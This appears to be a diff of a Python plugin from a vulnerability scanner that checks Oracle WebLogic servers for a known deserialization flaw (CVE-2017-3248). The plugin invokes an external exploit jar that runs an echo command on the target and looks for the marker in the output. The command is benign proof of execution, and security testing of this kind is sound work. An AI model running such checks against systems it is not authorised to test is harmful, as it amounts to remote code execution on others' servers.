@@ -17,7 +17,7 @@ from urllib.parse import urlparse
 
 class run(object):
     def __init__(self):
-        self.name = "CVE_2017_3506_weblogic"
+        self.name = "CVE_2017_3248_weblogic"
 
     def runCheck(self, targetAddr, payload):
         """
@@ -47,11 +47,11 @@ class run(object):
         try:
             p = Popen(
                 ['java', '-jar', '{}'.format(new_currnet_file_path), '-H', '{}'.format(hostname), '-P',
-                 '{}'.format(port), '-C', 'echo UjFhbmRyMG9wCg== | base64'], stdin=PIPE, stdout=PIPE, )
+                 '{}'.format(port), '-C', 'echo 72ad976ad5d491ad'], stdin=PIPE, stdout=PIPE, )
             p.wait()
             res = p.stdout.read()
 
-            if 'VWpGaGJtUnlNRzl3Q2c9PQo=' in str(res):
+            if '72ad976ad5d491ad' in str(res):
                 status_data = '[+]{} is vulnerable! {}'.format(targetAddr, currentTime)
                 return {'status': 20003, 'data': status_data, 'type': 'status'}
             else:
